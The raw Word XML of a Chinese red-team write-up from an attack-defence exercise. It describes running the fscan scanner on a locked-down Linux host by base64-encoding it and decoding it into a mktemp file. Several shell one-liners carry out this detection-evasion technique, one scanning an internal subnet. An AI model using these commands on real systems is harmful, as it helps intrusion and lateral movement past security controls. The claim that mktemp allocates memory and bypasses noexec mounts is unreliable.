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Linux无文件落地任意二进制执行</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="50" w:line="360" w:lineRule="auto" w:beforeLines="100"/>
        <w:ind w:left="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:bookmarkStart w:name="ufef2489c" w:id="0"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="false"/>
          <w:i w:val="false"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>之前的护网中，我遇到了一个很神奇的内网</w:t>
      </w:r>
    </w:p>
    <w:bookmarkEnd w:id="0"/>
    <w:bookmarkStart w:name="ubf4c1399" w:id="1"/>
    <w:p>
      <w:pPr>
        <w:spacing w:after="50" w:line="360" w:lineRule="auto" w:beforeLines="100"/>
        <w:ind w:left="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="false"/>
          <w:i w:val="false"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>这个内网的入口是一个Linux，出网，但是当我想用msf上线，或者丢一个fscan，或者丢一个frp的时候，总是不成功，可反弹shell完全正常</w:t>
      </w:r>
    </w:p>
    <w:bookmarkEnd w:id="1"/>
    <w:bookmarkStart w:name="uaf5ade59" w:id="2"/>
    <w:p>
      <w:pPr>
        <w:spacing w:after="50" w:line="360" w:lineRule="auto" w:beforeLines="100"/>
        <w:ind w:left="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="false"/>
          <w:i w:val="false"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>奇了怪了</w:t>
      </w:r>
    </w:p>
    <w:bookmarkEnd w:id="2"/>
    <w:bookmarkStart w:name="u588a869a" w:id="3"/>
    <w:p>
      <w:pPr>
        <w:spacing w:after="50" w:line="360" w:lineRule="auto" w:beforeLines="100"/>
        <w:ind w:left="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="false"/>
          <w:i w:val="false"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>发现是系统有些特殊的安全策略，咋回事儿呢？允许你放文本文件，但是可执行文件（ELF），shell脚本，直接不让你下载（因为护网的时间关系我没有确定是下载下来后系统自动删除还是根本下载不下来），总之，有一件事肯定的，没法直接丢一个ELF去操作了</w:t>
      </w:r>
    </w:p>
    <w:bookmarkEnd w:id="3"/>
    <w:bookmarkStart w:name="u254efa70" w:id="4"/>
    <w:p>
      <w:pPr>
        <w:spacing w:after="50" w:line="360" w:lineRule="auto" w:beforeLines="100"/>
        <w:ind w:left="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="false"/>
          <w:i w:val="false"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>那咋办？就我个人而言，我的习惯是先丢一个编译好的单文件frp走反向代理，如果防护不严的话，再丢一个fscan进去爆扫快速横向。可这一切，在这个安全策略的设置下，用不了。</w:t>
      </w:r>
    </w:p>
    <w:bookmarkEnd w:id="4"/>
    <w:bookmarkStart w:name="u6acb03e9" w:id="5"/>
    <w:p>
      <w:pPr>
        <w:spacing w:after="50" w:line="360" w:lineRule="auto" w:beforeLines="100"/>
        <w:ind w:left="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="false"/>
          <w:i w:val="false"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>但是天无绝人之路，单纯的elf用不了，可是Linux有一个很方便的命令——base64，于是我将fscan先base64编码</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="Courier New" w:eastAsia="宋体"/>
          <w:b w:val="false"/>
          <w:i w:val="false"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>base64 fscan &gt; fscan.txt</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="false"/>
          <w:i w:val="false"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>生成fscan.txt，然后再将fscan.txt上传到目标服务器。</w:t>
      </w:r>
    </w:p>
    <w:bookmarkEnd w:id="5"/>
    <w:bookmarkStart w:name="uead6fd62" w:id="6"/>
    <w:p>
      <w:pPr>
        <w:spacing w:after="50" w:line="360" w:lineRule="auto" w:beforeLines="100"/>
        <w:ind w:left="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="false"/>
          <w:i w:val="false"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>这样的话，只要我们能想办法运行这个被base64处理过的fscan.txt，就可以绕过这个安全策略。</w:t>
      </w:r>
    </w:p>
    <w:bookmarkEnd w:id="6"/>
    <w:bookmarkStart w:name="MiVLY" w:id="7"/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:spacing w:after="50" w:line="360" w:lineRule="auto" w:beforeLines="100"/>
        <w:ind w:left="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
        </w:rPr>
        <w:t>linux中的特殊函数</w:t>
      </w:r>
    </w:p>
    <w:bookmarkEnd w:id="7"/>
    <w:bookmarkStart w:name="u84f71f4c" w:id="8"/>
    <w:p>
      <w:pPr>
        <w:spacing w:after="50" w:line="360" w:lineRule="auto" w:beforeLines="100"/>
        <w:ind w:left="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="false"/>
          <w:i w:val="false"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>在Linux中有一个有意思的命令，mktemp，直接开启一块内存，我们知道，这个命令虽然不能实现完全无文件落地（毕竟Linux有着“一切皆文件”的哲学），但是对于绕过对于硬盘的恶意文件检测是绰绰有余。</w:t>
      </w:r>
    </w:p>
    <w:bookmarkEnd w:id="8"/>
    <w:bookmarkStart w:name="u5c7b81b2" w:id="9"/>
    <w:p>
      <w:pPr>
        <w:spacing w:after="50" w:line="360" w:lineRule="auto" w:beforeLines="100"/>
        <w:ind w:left="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="false"/>
          <w:i w:val="false"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>所以，我们可以实现将fscan.txt解码后暂存在内存里，运行这个内存里的fscan</w:t>
      </w:r>
    </w:p>
    <w:bookmarkEnd w:id="9"/>
    <w:bookmarkStart w:name="uc234a763" w:id="10"/>
    <w:p>
      <w:pPr>
        <w:spacing w:after="50" w:line="360" w:lineRule="auto" w:beforeLines="100"/>
        <w:ind w:left="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="false"/>
          <w:i w:val="false"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>如下：</w:t>
      </w:r>
    </w:p>
    <w:bookmarkEnd w:id="10"/>
    <w:bookmarkStart w:name="ucf17984e" w:id="11"/>
    <w:p>
      <w:pPr>
        <w:spacing w:after="50" w:line="360" w:lineRule="auto" w:beforeLines="100"/>
        <w:ind w:left="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="Courier New" w:eastAsia="宋体"/>
          <w:b w:val="false"/>
          <w:i w:val="false"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>base64 -d fscan.txt | (tmp=$(mktemp); cat &gt; "$tmp" &amp;&amp; chmod +x "$tmp" &amp;&amp; "$tmp")</w:t>
      </w:r>
    </w:p>
    <w:bookmarkEnd w:id="11"/>
    <w:bookmarkStart w:name="u3b82ca08" w:id="12"/>
    <w:p>
      <w:pPr>
        <w:spacing w:after="50" w:line="360" w:lineRule="auto" w:beforeLines="100"/>
        <w:ind w:left="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="false"/>
          <w:i w:val="false"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>需要加参数的话</w:t>
      </w:r>
    </w:p>
    <w:bookmarkEnd w:id="12"/>
    <w:bookmarkStart w:name="uf6c609da" w:id="13"/>
    <w:p>
      <w:pPr>
        <w:spacing w:after="50" w:line="360" w:lineRule="auto" w:beforeLines="100"/>
        <w:ind w:left="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="Courier New" w:eastAsia="宋体"/>
          <w:b w:val="false"/>
          <w:i w:val="false"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>base64 -d fscan.txt | (tmp=$(mktemp); cat &gt; "$tmp" &amp;&amp; chmod +x "$tmp" &amp;&amp; "$tmp" -h 10.0.0.16/24 -p 1-1500 -t 3000 -o result1.txt -np)</w:t>
      </w:r>
    </w:p>
    <w:bookmarkEnd w:id="13"/>
    <w:bookmarkStart w:name="u585ebfe8" w:id="14"/>
    <w:p>
      <w:pPr>
        <w:spacing w:after="50" w:line="360" w:lineRule="auto" w:beforeLines="100"/>
        <w:ind w:left="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:bookmarkStart w:name="u5901df92" w:id="15"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsia="宋体" w:ascii="宋体"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0">
            <wp:extent cx="5842000" cy="441631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8517466" cy="6438852"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
      <w:bookmarkEnd w:id="15"/>
    </w:p>
    <w:bookmarkEnd w:id="14"/>
    <w:bookmarkStart w:name="u23d944b6" w:id="16"/>
    <w:p>
      <w:pPr>
        <w:spacing w:after="50" w:line="360" w:lineRule="auto" w:beforeLines="100"/>
        <w:ind w:left="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="false"/>
          <w:i w:val="false"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>最终实现了这个策略的绕过，顺便一提，因为这是直接嗯造内存，所以甚至可以绕过mount的禁止执行设置</w:t>
      </w:r>
    </w:p>
    <w:bookmarkEnd w:id="16"/>
    <w:bookmarkStart w:name="owaap" w:id="17"/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:spacing w:after="50" w:line="360" w:lineRule="auto" w:beforeLines="100"/>
        <w:ind w:left="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
        </w:rPr>
        <w:t>其他的妙妙用法？</w:t>
      </w:r>
    </w:p>
    <w:bookmarkEnd w:id="17"/>
    <w:bookmarkStart w:name="u7f52f644" w:id="18"/>
    <w:p>
      <w:pPr>
        <w:spacing w:after="50" w:line="360" w:lineRule="auto" w:beforeLines="100"/>
        <w:ind w:left="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="false"/>
          <w:i w:val="false"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>护网结束后，我又仔细考虑了一下这个办法，因为打这个内网的时候，我丢了一个fscan.txt上去，实在不是很优雅，最起码，不是完全的无文件，特别是加密后的fscan.txt比之前大了好多，丢上去动静也不小</w:t>
      </w:r>
    </w:p>
    <w:bookmarkEnd w:id="18"/>
    <w:bookmarkStart w:name="ue5445c94" w:id="19"/>
    <w:p>
      <w:pPr>
        <w:spacing w:after="50" w:line="360" w:lineRule="auto" w:beforeLines="100"/>
        <w:ind w:left="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="false"/>
          <w:i w:val="false"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>于是我又在考虑其他的手法，能不能直接嗯造二进制，但是动静小，而且对于出网和不出网主机都有妙招的办法</w:t>
      </w:r>
    </w:p>
    <w:bookmarkEnd w:id="19"/>
    <w:bookmarkStart w:name="u0651eeed" w:id="20"/>
    <w:p>
      <w:pPr>
        <w:spacing w:after="50" w:line="360" w:lineRule="auto" w:beforeLines="100"/>
        <w:ind w:left="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="false"/>
          <w:i w:val="false"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>还真让我找到了</w:t>
      </w:r>
    </w:p>
    <w:bookmarkEnd w:id="20"/>
    <w:bookmarkStart w:name="jqvzE" w:id="21"/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
        <w:spacing w:after="50" w:line="360" w:lineRule="auto" w:beforeLines="100"/>
        <w:ind w:left="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
        </w:rPr>
        <w:t>对于出网主机的最佳办法</w:t>
      </w:r>
    </w:p>
    <w:bookmarkEnd w:id="21"/>
    <w:bookmarkStart w:name="u8478726e" w:id="22"/>
    <w:p>
      <w:pPr>
        <w:spacing w:after="50" w:line="360" w:lineRule="auto" w:beforeLines="100"/>
        <w:ind w:left="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="false"/>
          <w:i w:val="false"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>依然是fscan.txt，但是不需要下载，可以直接从文件流读入</w:t>
      </w:r>
    </w:p>
    <w:bookmarkEnd w:id="22"/>
    <w:bookmarkStart w:name="ub24f4704" w:id="23"/>
    <w:p>
      <w:pPr>
        <w:spacing w:after="50" w:line="360" w:lineRule="auto" w:beforeLines="100"/>
        <w:ind w:left="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="false"/>
          <w:i w:val="false"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>比如我放在我的vps上，开启nc</w:t>
      </w:r>
    </w:p>
    <w:bookmarkEnd w:id="23"/>
    <w:bookmarkStart w:name="u694703b9" w:id="24"/>
    <w:p>
      <w:pPr>
        <w:spacing w:after="50" w:line="360" w:lineRule="auto" w:beforeLines="100"/>
        <w:ind w:left="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="false"/>
          <w:i w:val="false"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>然后靶机直接从tcp流读入&lt;</w:t>
      </w:r>
    </w:p>
    <w:bookmarkEnd w:id="24"/>
    <w:bookmarkStart w:name="oQ5ZI" w:id="25"/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
        <w:spacing w:after="50" w:line="360" w:lineRule="auto" w:beforeLines="100"/>
        <w:ind w:left="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
        </w:rPr>
        <w:t>对于不出网主机的最佳办法</w:t>
      </w:r>
    </w:p>
    <w:bookmarkEnd w:id="25"/>
    <w:bookmarkStart w:name="ua20e34d1" w:id="26"/>
    <w:p>
      <w:pPr>
        <w:spacing w:after="50" w:line="360" w:lineRule="auto" w:beforeLines="100"/>
        <w:ind w:left="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="false"/>
          <w:i w:val="false"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>那就是echo命令，嘻嘻</w:t>
      </w:r>
    </w:p>
    <w:bookmarkEnd w:id="26"/>
    <w:bookmarkStart w:name="u161ca245" w:id="27"/>
    <w:p>
      <w:pPr>
        <w:spacing w:after="50" w:line="360" w:lineRule="auto" w:beforeLines="100"/>
        <w:ind w:left="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="false"/>
          <w:i w:val="false"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>直接把base64处理过的fscan.txt写进命令里</w:t>
      </w:r>
    </w:p>
    <w:bookmarkEnd w:id="27"/>
    <w:bookmarkStart w:name="ufb3ba943" w:id="28"/>
    <w:p>
      <w:pPr>
        <w:spacing w:after="50" w:line="360" w:lineRule="auto" w:beforeLines="100"/>
        <w:ind w:left="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="Courier New" w:eastAsia="宋体"/>
          <w:b w:val="false"/>
          <w:i w:val="false"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>echo "base64处理过的二进制文件" | base64 -d | (tmp=$(mktemp); cat &gt; "$tmp" &amp;&amp; chmod +x "$tmp" &amp;&amp; "$tmp" -参数)</w:t>
      </w:r>
    </w:p>
    <w:bookmarkEnd w:id="28"/>
    <w:bookmarkStart w:name="u05c5c0f5" w:id="29"/>
    <w:p>
      <w:pPr>
        <w:spacing w:after="50" w:line="360" w:lineRule="auto" w:beforeLines="100"/>
        <w:ind w:left="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="false"/>
          <w:i w:val="false"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>这样直接就能执行</w:t>
      </w:r>
    </w:p>
    <w:bookmarkEnd w:id="29"/>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